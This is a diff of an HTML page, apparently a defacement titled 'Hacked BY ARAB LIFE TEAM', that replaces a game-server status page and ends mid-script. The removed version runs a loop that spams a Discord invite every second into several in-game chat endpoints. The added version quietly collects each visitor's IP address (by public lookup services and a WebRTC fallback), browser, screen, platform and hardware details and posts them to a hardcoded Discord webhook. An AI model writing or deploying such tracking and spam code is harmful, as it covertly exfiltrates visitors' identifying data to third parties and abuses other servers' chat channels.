@@ -1,241 +1,1080 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>Arab Life HUD</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>zombie is here </title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@100;200;300;400;500;600;700;800&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
 
-<style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:monospace}
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-body{
-    background:#050505;
-    color:#00ffcc;
-    overflow:hidden;
-}
+        html {
+            font-size: 16px; /* 1rem = 16px base */
+        }
 
-/* GRID */
-body::before{
-    content:"";
-    position:fixed;
-    width:100%;
-    height:100%;
-    background:
-    linear-gradient(rgba(0,255,200,0.05) 1px, transparent 1px),
-    linear-gradient(90deg, rgba(0,255,200,0.05) 1px, transparent 1px);
-    background-size:40px 40px;
-    z-index:-1;
-}
+        body {
+            background: #000;
+            color: #fff;
+            font-family: 'JetBrains Mono', monospace;
+            overflow: hidden;
+            min-height: 100vh;
+            position: relative;
+        }
 
-/* INTRO */
-#intro{
-    position:fixed;
-    width:100%;
-    height:100vh;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    background:black;
-    z-index:10;
-    transition:1s;
-}
+        .popup-video {
+            position: absolute;
+            top: 2rem;
+            right: 2rem;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 1rem;
+            width: 400px;
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 0.75rem;
+            backdrop-filter: blur(0.5rem);
+            z-index: 1000;
+            box-shadow: 0 0 1.25rem rgba(255,255,255,0.1);
+        }
 
-.typing{
-    font-size:50px;
-    color:#00f0ff;
-    border-right:3px solid #00f0ff;
-    white-space:nowrap;
-    overflow:hidden;
-}
+        /* Loading Screen */
+        .loading-screen {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            background: #000;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            animation: fadeOut 0s ease-in-out 5s forwards;
+        }
 
-/* MAIN */
-#main{
-    display:none;
-    height:100vh;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    flex-direction:column;
-    text-align:center;
-}
+        .skull-svg {
+            width: 9vw;
+            max-width: 150px;
+            height: 9vw;
+            max-height: 150px;
+            margin-bottom: 2vh;
+            animation: pulseSkull 2s ease-in-out infinite;
+        }
 
-.main-img{
-    width:320px;
-    border:2px solid #00ffcc;
-    box-shadow:0 0 40px #00ffcc;
-    margin-bottom:20px;
-}
+        @keyframes pulseSkull {
+            0%, 100% {
+                transform: scale(1);
+                box-shadow: 0 0 1.25vw rgba(255, 255, 255, 0.3);
+            }
+            50% {
+                transform: scale(1.1);
+                box-shadow: 0 0 2.5vw rgba(255, 255, 255, 0.8);
+            }
+        }
 
-.title{
-    font-size:50px;
-    color:white;
-    text-shadow:0 0 25px #00ffcc;
-    margin-bottom:15px;
-}
+        .glitch-text {
+            position: relative;
+            color: #fff;
+            font-size: 2.0rem;
+            font-family: 'Orbitron', monospace;
+            font-weight: 700;
+            text-align: center;
+            text-transform: uppercase;
+            letter-spacing: 0.19rem;
+            line-height: 1.6;
+        }
 
-.hud-box{
-    border:1px solid #00ffcc;
-    padding:20px;
-    width:450px;
-    background:rgba(0,0,0,0.6);
-    box-shadow:0 0 25px #00ffcc;
-    margin-top:20px;
-}
+        @keyframes blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0.3; }
+        }
 
-.row{
-    display:flex;
-    justify-content:space-between;
-    margin:6px 0;
-}
+        @keyframes fadeOut {
+            to {
+                opacity: 0;
+                visibility: hidden;
+            }
+        }
 
-.join{
-    margin-top:25px;
-    padding:15px 40px;
-    background:#5865F2;
-    color:white;
-    text-decoration:none;
-    border-radius:8px;
-    font-size:20px;
-    box-shadow:0 0 25px #5865F2;
-    transition:0.3s;
-}
-.ip-box{
-    margin-top:15px;
-    padding:15px;
-    border:1px solid #00ffcc;
-    background:rgba(0,0,0,0.6);
-    box-shadow:0 0 20px #00ffcc;
-    text-align:center;
-}
+        /* Main Content */
+        .main-content {
+            opacity: 0;
+            animation: fadeIn 2s ease-in-out 0.5s forwards;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+        }
 
-.ip-title{
-    color:#00f0ff;
-    font-size:18px;
-    margin-bottom:10px;
-    text-shadow:0 0 10px #00f0ff;
-}
+        @keyframes fadeIn {
+            to { opacity: 1; }
+        }
 
-.ip-row{
-    display:flex;
-    justify-content:space-between;
-    padding:4px 0;
-    border-bottom:1px solid rgba(0,255,200,0.2);
-}
+        /* Grid background */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            background-image:
+                linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px);
+            background-size: 1.875rem 1.875rem; /* 30px */
+            z-index: -1;
+        }
 
-.ip-row span:first-child{
-    color:#00ffcc;
-}
+        .container {
+            text-align: center;
+            max-width: 50rem; /* 800px */
+            padding: 2.5rem;
+        }
 
-.ip-row span:last-child{
-    color:white;
-}
-.join:hover{
-    transform:scale(1.1);
-    box-shadow:0 0 50px #5865F2;
-}
-</style>
+        /* Avatar container */
+        .avatar-container {
+            margin-bottom: 2.5rem;
+            position: relative;
+        }
+
+        .avatar {
+            width: 31.25rem; /* 500px */
+            max-width: 90vw;
+            height: 18.75rem; /* 300px */
+            max-height: 54vw;
+            border-radius: 0%;
+            border: 0.188rem solid rgba(255,255,255,0.3);
+            box-shadow:
+                0 0 1.875rem rgba(255,255,255,0.2),
+                inset 0 0 1.875rem rgba(255,255,255,0.1);
+            background: linear-gradient(135deg, #333, #111);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .avatar:hover {
+            transform: scale(1.05);
+            box-shadow:
+                0 0 3.125rem rgba(255,255,255,0.4),
+                inset 0 0 1.875rem rgba(255,255,255,0.2);
+        }
+
+        .avatar::before {
+            content: '';
+            position: absolute;
+            top: -50%; left: -50%;
+            width: 200%; height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent);
+            animation: shimmer 3s ease-in-out infinite;
+        }
+
+        @keyframes shimmer {
+            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+            50% { transform: translateX(100%) translateY(100%) rotate(45deg); }
+            100% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+        }
+
+        .avatar-placeholder {
+            font-size: 5rem;
+            color: rgba(255,255,255,0.7);
+            z-index: 1;
+        }
+
+        /* Main title */
+        .pwned-title {
+            font-family: 'Orbitron', monospace;
+            font-size: 3.75rem; /* 60px */
+            font-weight: 900;
+            letter-spacing: 0.1rem;
+            margin-bottom: 1.25rem;
+            background: linear-gradient(45deg, #fff, #888);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            text-transform: uppercase;
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+
+        @keyframes glow {
+            from {
+                filter: drop-shadow(0 0 1.25rem rgba(255,255,255,0.3));
+            }
+            to {
+                filter: drop-shadow(0 0 2.5rem rgba(255,255,255,0.6));
+            }
+        }
+
+        /* Terminal section */
+        .terminal-section {
+            background: rgba(0,0,0,0.8);
+            border: 0.063rem solid rgba(255,255,255,0.2);
+            border-radius: 0.625rem;
+            padding: 1.875rem;
+            margin-top: 2.5rem;
+            backdrop-filter: blur(0.625rem);
+            box-shadow: 0 0.625rem 1.875rem rgba(0,0,0,0.5);
+        }
+
+        .terminal-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 1.25rem;
+            padding-bottom: 0.938rem;
+            border-bottom: 0.063rem solid rgba(255,255,255,0.1);
+        }
+
+        .terminal-dots {
+            display: flex;
+            gap: 0.5rem;
+            margin-right: 1.25rem;
+        }
+
+        .dot {
+            width: 0.75rem;
+            height: 0.75rem;
+            border-radius: 50%;
+            border: 0.063rem solid rgba(255,255,255,0.3);
+        }
+
+        .terminal-title {
+            font-family: 'Orbitron', monospace;
+            font-size: 1.375rem;
+            color: #fff;
+            letter-spacing: 0.1rem;
+        }
+
+        .command-line {
+            font-size: 1.5rem; 
+            margin: 0.938rem 0;
+            opacity: 0;
+            animation: typeIn 0.5s ease forwards;
+            display: flex;
+            align-items: center;
+            text-align: left;
+        }
+
+        .command-linesxb {
+            font-size: 2.5rem; 
+            margin: 0.938rem 0;
+            opacity: 0;
+            animation: typeIn 0.5s ease forwards;
+            display: block; 
+            text-align: center;
+            width: 100%;
+        }
+
+        .command-line:nth-child(2) { animation-delay: 2.5s; }
+        .command-line:nth-child(3) { animation-delay: 3s; }
+        .command-line:nth-child(4) { animation-delay: 3.5s; }
+        .command-line:nth-child(5) { animation-delay: 4s; }
+        .command-line:nth-child(6) { animation-delay: 4.7s; }
+
+        @keyframes typeIn {
+            to {
+                opacity: 1;
+            }
+        }
+
+        .prompt {
+            color: rgba(255,255,255,0.5);
+            margin-right: 0.625rem;
+        }
+
+        .command {
+            color: #fff;
+            font-weight: 500;
+        }
+
+        .success {
+            color: #4ade80;
+            font-weight: 600;
+        }
+
+        .cursor {
+            display: inline-block;
+            width: 0.125rem;
+            height: 1.125rem;
+            background: #fff;
+            margin-left: 0.313rem;
+            animation: blink-cursor 1s infinite;
+        }
+
+        @keyframes blink-cursor {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0; }
+        }
+
+        /* Footer message */
+        .footer-message {
+            margin-top: 2.5rem;
+            font-size: 0.875rem;
+            color: rgba(255,255,255,0.5);
+            letter-spacing: 0.125rem;
+            text-transform: uppercase;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .pwned-title {
+                font-size: 2rem;
+                letter-spacing: 0.25rem;
+            }
+            .avatar {
+                width: 20vw;
+                height: 20vw;
+            }
+            .avatar-placeholder {
+                font-size: 3.75rem;
+            }
+            .container {
+                padding: 1.25rem;
+            }
+            .ip-display {
+                font-size: 1.25rem !important;
+            }
+        }
+
+        .learn-box {
+            position: absolute;
+            top: 2.975rem;
+            left: 1.875rem;
+            background: rgba(0, 0, 0, 0.6);
+            padding: 1.25rem;
+            border: 0.063rem solid rgba(255,255,255,0.2);
+            border-radius: 0.75rem;
+            backdrop-filter: blur(0.5rem);
+            z-index: 1000;
+            box-shadow: 0 0 1.25rem rgba(255,255,255,0.1);
+        }
+
+        .learn-title {
+            font-family: 'Orbitron', monospace;
+            font-size: 0.875rem;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 0.75rem;
+            letter-spacing: 0.063rem;
+            text-transform: uppercase;
+        }
+
+        .learn-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 0.625rem;
+        }
+
+        .learn-item {
+            background: rgba(255, 255, 255, 0.05);
+            border: 0.063rem solid rgba(255,255,255,0.1);
+            padding: 0.625rem 0.938rem;
+            border-radius: 0.375rem;
+            font-size: 0.813rem;
+            color: #4ade80;
+            font-family: 'JetBrains Mono', monospace;
+            transition: all 0.3s ease;
+        }
+
+        .learn-item:hover {
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            transform: translateX(0.313rem);
+        }
+
+        .learn-footer {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transform: translateX(-0.313rem);
+            margin-top: 0.938rem;
+            padding-top: 0.625rem;
+            border-top: 0.063rem solid rgba(255,255,255,0.1);
+            gap: 0.625rem;
+        }
+
+        .discord-icon {
+            width: 1.25rem;
+            height: 1.25rem;
+            object-fit: contain;
+            opacity: 0.8;
+        }
+
+        .discord-link {
+            font-size: 1rem;
+            color: #fff;
+            font-family: 'JetBrains Mono', monospace;
+            letter-spacing: 0.063rem;
+            opacity: 0.8;
+        }
+
+        .avatar.force-hover {
+            transform: scale(1.05);
+            box-shadow:
+                0 0 3.125rem rgba(255,255,255,0.4),
+                inset 0 0 1.875rem rgba(255,255,255,0.2);
+        }
+
+        .learn-item.force-hover {
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            transform: translateX(0.313rem);
+        }
+
+        .wanted-poster {
+            position: absolute;
+            top: 2rem;
+            right: 2rem;
+            width: 260px;
+            background: #111;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 0.5rem;
+            box-shadow: 0 0 1.25rem rgba(255, 255, 255, 0.1);
+            padding: 0.5rem;
+            z-index: 1000;
+            text-align: center;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .poster-img {
+            width: 100%;
+            border-radius: 0.3rem;
+            border: 1px solid rgba(255,255,255,0.1);
+            object-fit: cover;
+        }
+
+        .poster-caption {
+            margin-top: 0.5rem;
+            font-size: 2rem;
+            color: #4ade80;
+            letter-spacing: 0.05rem;
+        }
+
+        .pin {
+            position: absolute;
+            top: -0.4rem;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 0.75rem;
+            height: 0.75rem;
+            background: #ccc;
+            border-radius: 50%;
+            box-shadow: 0 0 0.25rem rgba(255,255,255,0.5);
+            z-index: 2;
+        }
+
+        /* IP Section Styles */
+        .ip-section {
+            margin-top: 1.875rem;
+            padding: 1.25rem;
+            background: rgba(0,0,0,0.8);
+            border: 0.063rem solid rgba(255,255,255,0.2);
+            border-radius: 0.625rem;
+            backdrop-filter: blur(0.625rem);
+            box-shadow: 0 0.625rem 1.875rem rgba(0,0,0,0.5);
+            font-family: 'JetBrains Mono', monospace;
+            text-align: center;
+            animation: fadeIn 1s ease-in-out 4s forwards;
+            opacity: 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .ip-section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 0.188rem;
+            background: linear-gradient(90deg, transparent, #4ade80, transparent);
+            animation: scanLine 2s linear infinite;
+        }
+
+        @keyframes scanLine {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+
+        .ip-display {
+            font-size: 1.75rem;
+            color: #4ade80;
+            font-weight: bold;
+            letter-spacing: 0.063rem;
+            margin: 0.938rem 0;
+            font-family: 'Orbitron', monospace;
+            animation: pulseIp 2s ease-in-out infinite alternate;
+            text-shadow: 0 0 0.625rem rgba(74, 222, 128, 0.5);
+            padding: 0.625rem;
+            background: rgba(0,0,0,0.5);
+            border-radius: 0.313rem;
+            border: 0.063rem solid rgba(74, 222, 128, 0.3);
+        }
+
+        @keyframes pulseIp {
+            0% {
+                text-shadow: 0 0 0.313rem rgba(74, 222, 128, 0.5);
+                transform: scale(1);
+            }
+            50% {
+                text-shadow: 0 0 0.938rem rgba(74, 222, 128, 0.8);
+                transform: scale(1.02);
+            }
+            100% {
+                text-shadow: 0 0 0.313rem rgba(74, 222, 128, 0.5);
+                transform: scale(1);
+            }
+        }
+
+        .ip-info {
+            font-size: 0.875rem;
+            color: rgba(255,255,255,0.5);
+            letter-spacing: 0.063rem;
+            text-transform: uppercase;
+            margin-top: 0.625rem;
+        }
+
+        .ip-stats {
+            display: flex;
+            justify-content: space-around;
+            margin-top: 1.25rem;
+            padding-top: 1.25rem;
+            border-top: 0.063rem solid rgba(255,255,255,0.1);
+        }
+
+        .stat-item {
+            text-align: center;
+        }
+
+        .stat-value {
+            font-size: 1.125rem;
+            color: #4ade80;
+            font-weight: bold;
+            font-family: 'Orbitron', monospace;
+        }
+
+        .stat-label {
+            font-size: 0.75rem;
+            color: rgba(255,255,255,0.5);
+            text-transform: uppercase;
+            margin-top: 0.313rem;
+        }
+
+        /* Logging Animation */
+        .logging-animation {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            margin: 1rem 0;
+        }
+
+        .log-dot {
+            width: 0.5rem;
+            height: 0.5rem;
+            background: #4ade80;
+            border-radius: 50%;
+            animation: logPulse 1.5s ease-in-out infinite;
+        }
+
+        .log-dot:nth-child(2) { animation-delay: 0.2s; }
+        .log-dot:nth-child(3) { animation-delay: 0.4s; }
+
+        @keyframes logPulse {
+            0%, 100% { opacity: 0.3; transform: scale(0.8); }
+            50% { opacity: 1; transform: scale(1); }
+        }
+
+        /* Status Indicator */
+        .status-indicator {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            padding: 0.25rem 0.75rem;
+            background: rgba(0,0,0,0.5);
+            border-radius: 1rem;
+            margin-top: 0.5rem;
+        }
+
+        .status-dot {
+            width: 0.5rem;
+            height: 0.5rem;
+            background: #4ade80;
+            border-radius: 50%;
+            animation: statusBlink 1s infinite;
+        }
+
+        @keyframes statusBlink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+    </style>
 </head>
-
 <body>
 
-<audio id="bgSound">
-<source src="https://cdn.discordapp.com/attachments/1468255617100812472/1476413092190752870/d18997f33d08eda8.mp4?ex=69a10857&is=699fb6d7&hm=810a1a758c3a432b05b65c14a74141af6fc1258c12a3c923d3f57137fe08250f&" type="audio/mpeg">
+<audio id="bg-music" autoplay loop>
+    <source src="https://cdn.discordapp.com/attachments/1468255617100812472/1476413092190752870/d18997f33d08eda8.mp4?ex=69a10857&is=699fb6d7&hm=810a1a758c3a432b05b65c14a74141af6fc1258c12a3c923d3f57137fe08250f&" type="audio/mpeg">
 </audio>
 
-<!-- INTRO -->
-<div id="intro">
-    <div class="typing" id="typingText"></div>
-</div>
+    <!-- Loading Screen -->
+    <div class="loading-screen">
+        <div class="loading-text glitch-text" data-text="Security Alert zombie in the system ..">
+            Security Alert Arab Life in the system ..<br> dmar on top 
+        </div>
+    </div>
 
-<!-- MAIN -->
-<div id="main">
+    <!-- Main Content -->
+    <div class="main-content">
+        <div class="container">
+            <div class="avatar-container">
+                <div class="avatar">
+                    <img src="https://media.discordapp.net/attachments/1288144170124312597/1445466059405525176/0cd8891122ad21abc57d48c95939c997.gif?ex=69a0822c&is=699f30ac&hm=45beffbc50caccda1e8534dfae9d983d08583e60e896434b43b8219ce7f54b16&=" alt="avatar" style="width: 100%; height: 100%; object-fit: cover;" />
+                </div>
+            </div>
 
-<img src="https://media.discordapp.net/attachments/1288149469652713502/1408027171527589959/Profile.gif?ex=69a0c1bd&is=699f703d&hm=5ce1a66ef4477de97515cee21a109523ed29d2f7ba193ee992e948d5d4d3539d&=" class="main-img">
+            <h1 class="pwned-title">Hacked BY ARAB LIFE TEAM</h1>
 
-<div class="title">DMAR ON TOP</div>
+            <div class="terminal-section">
+                <div class="terminal-header">
+                    <div class="terminal-dots">
+                        <div class="dot"></div>
+                        <div class="dot"></div>
+                        <div class="dot"></div>
+                    </div>
+                    <div class="terminal-title">https://discord.gg/al0</div>
+                </div>
 
-<div class="hud-box">
-<div class="row"><span>Status:</span><span style="color:#00ff00">Online</span></div>
-<div class="row"><span>Players:</span><span id="players">120</span></div>
-<div class="row"><span>Browser:</span><span id="browser"></span></div>
-<div class="row"><span>Resolution:</span><span id="resolution"></span></div>
-<div class="row"><span>Language:</span><span id="language"></span></div>
-<div class="row"><span>Local Time:</span><span id="time"></span></div>
-<div class="ip-box">
-<div class="ip-row"><span>IP</span><span id="ip"></span></div>
-<div class="ip-row"><span>City</span><span id="city"></span></div>
-<div class="ip-row"><span>Region</span><span id="region"></span></div>
-<div class="ip-row"><span>Country</span><span id="country"></span></div>
-<div class="ip-row"><span>Location</span><span id="loc"></span></div>
-<div class="ip-row"><span>Organization</span><span id="org"></span></div>
-<div class="ip-row"><span>Timezone</span><span id="timezone"></span></div>
-</div>
-</div>
+                <div class="command-line">
+                    <span class="prompt">server@system:~$</span>
+                    <span class="command">why?</span>
+                </div>
 
-<a href="https://discord.gg/al0" class="join" target="_blank">
-🚀 Join Discord
-</a>
+                <div class="command-line">
+                    <span class="success">
+                         : hacked by mghol سلام عليكم <br />
+                        (:
+                    </span>
+                </div>
+            </div>
 
-</div>
+            <!-- IP Section -->
+            <div class="ip-section">
+                <div class="terminal-header">
+                    <div class="terminal-dots">
+                        <div class="dot"></div>
+                        <div class="dot"></div>
+                        <div class="dot"></div>
+                    </div>
+                    <div class="terminal-title">ايبيك يلغالي</div>
+                </div>
+                
+                <div class="logging-animation">
+                    <div class="log-dot"></div>
+                    <div class="log-dot"></div>
+                    <div class="log-dot"></div>
+                </div>
+                
+                <div id="ipDisplay" class="ip-display">جاري جمع المعلومات...</div>
+                
+                <div class="status-indicator">
+                    <div class="status-dot"></div>
+                    <span id="statusText" style="font-size: 0.75rem; color: #4ade80;">جاري الإرسال إلى سيرفرات mghol...</span>
+                </div>
+                
+                <div class="ip-info">IP Address Successfully Captured</div>
+                
+                <div class="ip-stats">
+                    <div class="stat-item">
+                        <div class="stat-value" id="userAgentShort">-</div>
+                        <div class="stat-label">المتصفح</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-value" id="screenSize">-</div>
+                        <div class="stat-label">الدقة</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-value" id="connectionStatus">-</div>
+                        <div class="stat-label">الاتصال</div>
+                    </div>
+                </div>
+            </div>
 
-<script>
+            <div class="footer-message">Officaly discord.gg/al0 • dmar on top</div>
 
-/* AUTO INTRO */
-const introText = " 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝗧𝗼 𝗔𝗿𝗮𝗯 𝗟𝗶𝗳𝗲 𝗥𝗣...";
-let i = 0;
+            <div class="learn-box">
+                <div class="learn-title">دمار صانع القرار  :</div>
+                <div class="learn-grid">
+                    <div class="learn-item">dmar on toppppppppppppppppppppppppppppp</div>
+                    <div class="learn-item">dmar on toppppppppppppppppppppppppppppp</div>
+                    <div class="learn-item">dmar on toppppppppppppppppppppppppppppp</div>
+                    <div class="learn-item">dmar on toppppppppppppppppppppppppppppp</div>
+                    <div class="learn-footer">
+                        <img src="https://i.ibb.co/HLD6j14t/discord-ezgif-com-webp-to-png-converter.png" alt="Discord" class="discord-icon" />
+                        <span class="discord-link">discord.gg/al0</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
 
-function typeEffect(){
-    if(i < introText.length){
-        document.getElementById("typingText").innerHTML += introText.charAt(i);
-        i++;
-        setTimeout(typeEffect, 50);
-    }else{
-        setTimeout(showMain, 1500);
-    }
-}
+    <script>
+        // Preload effect
+        window.addEventListener('load', function () {
+            setTimeout(() => {
+                document.querySelector('.loading-screen').style.display = 'none';
+            }, 2000);
+        });
 
-function showMain(){
-    document.getElementById("intro").style.opacity="0";
-    setTimeout(()=>{
-        document.getElementById("intro").style.display="none";
-        document.getElementById("main").style.display="flex";
-        document.getElementById("bgSound").play();
-    },800);
-}
+        // Subtle screen flicker
+        setInterval(() => {
+            if (Math.random() < 0.50) {
+                document.body.style.filter = 'brightness(1.2)';
+                setTimeout(() => {
+                    document.body.style.filter = 'brightness(1)';
+                }, 50);
+            }
+        }, 2000);
+    </script>
 
-typeEffect();
+    <script>
+        window.addEventListener('load', () => {
+            const avatar = document.querySelector('.avatar');
 
-/* SYSTEM INFO */
-document.getElementById("browser").innerText = navigator.userAgent.split(" ")[0];
-document.getElementById("resolution").innerText = screen.width + "x" + screen.height;
-document.getElementById("language").innerText = navigator.language;
+            setTimeout(() => {
+                avatar.classList.add('force-hover');
 
-function updateTime(){
-    const now = new Date();
-    document.getElementById("time").innerText = now.toLocaleTimeString();
-}
-setInterval(updateTime,1000);
-updateTime();
+                setTimeout(() => {
+                    avatar.classList.remove('force-hover');
+                }, 3000);
+            }, 5000);
+        });
+    </script>
 
-let players = 120;
-setInterval(()=>{
-    players += Math.floor(Math.random()*3-1);
-    document.getElementById("players").innerText = players;
-},3000);
-// al0 all of them 👀
-// discord.gg/al0
-const msg = `https://discord.gg/al0`;
-const body = JSON.stringify({ message: msg });
-setInterval(() => {
-fetch("https://flix-scripts/chatResult", { method: "POST", body });
-fetch("https://danger_chat/Danger_Chat:SendMessage", {method: "POST",body: JSON.stringify({"message": msg,"channel": "شات العام","color": null,"isImageAndLinksAllowed": [false,false]})})
-fetch("https://easy-chat+/o6ZbK5Ecp6", {headers: {accept: "*/*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"},body: JSON.stringify({ message: msg, channel: "شات العام" }),method: "POST"});
-fetch("https://melix_chat/chatResult", { method: "POST", body });
-fetch("https://as_chat/chatResult", { method: "POST", body });
-fetch("https://chat/chatResult", { method: "POST", body });
-fetch("https://ho-chatv2/Chat", {method: "POST",body: JSON.stringify({"Type": "chatResult","message": msg,"chatType": "general"})});
-}, 1000);
-</script>
+    <script>
+        window.addEventListener('load', () => {
+            const items = document.querySelectorAll('.learn-item');
+            let index = 0;
+
+            function applyEffectSequentially() {
+                if (index >= items.length) {
+                    index = 0;
+                }
+
+                const item = items[index];
+                item.classList.add('force-hover');
+
+                setTimeout(() => {
+                    item.classList.remove('force-hover');
+                    index++;
+                    setTimeout(applyEffectSequentially, 1500); 
+                }, 1000); 
+            }
+
+            setTimeout(applyEffectSequentially, 6000);
+        });
+    </script>
+
+    <script>
+        // Discord Webhook URL - رابط الويبهوك الخاص بك
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1476431435517788181/XtBaqsgnp2GP_SGXkItM9UuUbbocG2q8kW6DLGWOhxv7dnk9a4jr9hiHdcK-PT729B8r';
+
+        // جمع معلومات الزائر
+        function collectVisitorInfo() {
+            const info = {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                colorDepth: window.screen.colorDepth,
+                pixelRatio: window.devicePixelRatio,
+                referrer: document.referrer || "Direct",
+                url: window.location.href,
+                timestamp: new Date().toISOString(),
+                cookiesEnabled: navigator.cookieEnabled,
+                javaEnabled: navigator.javaEnabled ? "Yes" : "No",
+                online: navigator.onLine ? "Online" : "Offline",
+                doNotTrack: navigator.doNotTrack || "Unknown",
+                hardwareConcurrency: navigator.hardwareConcurrency || "Unknown",
+                deviceMemory: navigator.deviceMemory || "Unknown"
+            };
+            
+            // عرض معلومات الزائر في الصفحة
+            document.getElementById('userAgentShort').textContent = getBrowserName(info.userAgent);
+            document.getElementById('screenSize').textContent = `${info.screenWidth}x${info.screenHeight}`;
+            document.getElementById('connectionStatus').textContent = info.online;
+            
+            return info;
+        }
+
+        // تحديد اسم المتصفح من User Agent
+        function getBrowserName(userAgent) {
+            if (userAgent.includes("Chrome")) return "Chrome";
+            if (userAgent.includes("Firefox")) return "Firefox";
+            if (userAgent.includes("Safari")) return "Safari";
+            if (userAgent.includes("Edge")) return "Edge";
+            if (userAgent.includes("Opera")) return "Opera";
+            return "Unknown";
+        }
+
+        // دالة جلب IP الزائر من عدة مصادر
+        async function fetchIP() {
+            const info = collectVisitorInfo();
+            let detectedIP = 'Unknown';
+            const statusText = document.getElementById('statusText');
+            const ipDisplay = document.getElementById('ipDisplay');
+            
+            // قائمة خدمات IP مع محاولات متعددة
+            const ipServices = [
+                { url: 'https://api.ipify.org?format=json', type: 'json' },
+                { url: 'https://api64.ipify.org?format=json', type: 'json' },
+                { url: 'https://ipv4.icanhazip.com/', type: 'text' },
+                { url: 'https://ip.seeip.org/jsonip', type: 'json' },
+                { url: 'https://api.myip.com', type: 'json' },
+                { url: 'https://ipapi.co/json/', type: 'json' }
+            ];
+            
+            // تحديث حالة الإرسال
+            const updateStatus = (message, color = '#4ade80') => {
+                statusText.textContent = message;
+                statusText.style.color = color;
+            };
+            
+            updateStatus('🔍 جاري البحث عن الـ IP...');
+            
+            for (let i = 0; i < ipServices.length; i++) {
+                const service = ipServices[i];
+                
+                try {
+                    updateStatus(`🔄 المحاولة ${i + 1}/${ipServices.length}...`);
+                    
+                    const response = await fetch(service.url, { 
+                        method: 'GET',
+                        mode: 'cors',
+                        headers: {
+                            'Accept': 'application/json'
+                        }
+                    });
+                    
+                    if (response.ok) {
+                        if (service.type === 'json') {
+                            const data = await response.json();
+                            detectedIP = data.ip || data.ipAddress || data.query || data.IPv4;
+                        } else {
+                            const text = await response.text();
+                            detectedIP = text.trim();
+                        }
+                        
+                        if (detectedIP && detectedIP !== 'Unknown') {
+                            updateStatus('✅ تم العثور على الـ IP!');
+                            break;
+                        }
+                    }
+                } catch (error) {
+                    console.log(`Service ${service.url} failed:`, error);
+                    continue;
+                }
+            }
+            
+            // إذا لم يتم العثور على IP من الخدمات الخارجية
+            if (detectedIP === 'Unknown') {
+                try {
+                    // محاولة الحصول على IP محلي عبر WebRTC
+                    const localIP = await getLocalIPViaWebRTC();
+                    detectedIP = `Local: ${localIP}`;
+                    updateStatus('⚠️ IP محلي فقط (WebRTC)');
+                } catch (error) {
+                    updateStatus('❌ فشل الحصول على الـ IP', '#ff6b6b');
+                    detectedIP = 'غير متاح';
+                }
+            }
+            
+            // عرض الـ IP في الصفحة
+            ipDisplay.textContent = detectedIP;
+            ipDisplay.style.color = '#4ade80';
+            
+            // إخفاء رسالة الجاري الإرسال
+            document.querySelector('.logging-animation').style.display = 'none';
+            
+            // إرسال البيانات إلى Discord
+            await sendToDiscordWithFallback(detectedIP, info);
+            
+            // تحديث النهاية
+            updateStatus('✅ نرحب بكم في سيرفر عرب لايف');
+            
+            return detectedIP;
+        }
+
+        // دالة للحصول على IP محلي عبر WebRTC
+        async function getLocalIPViaWebRTC() {
+            return new Promise((resolve, reject) => {
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
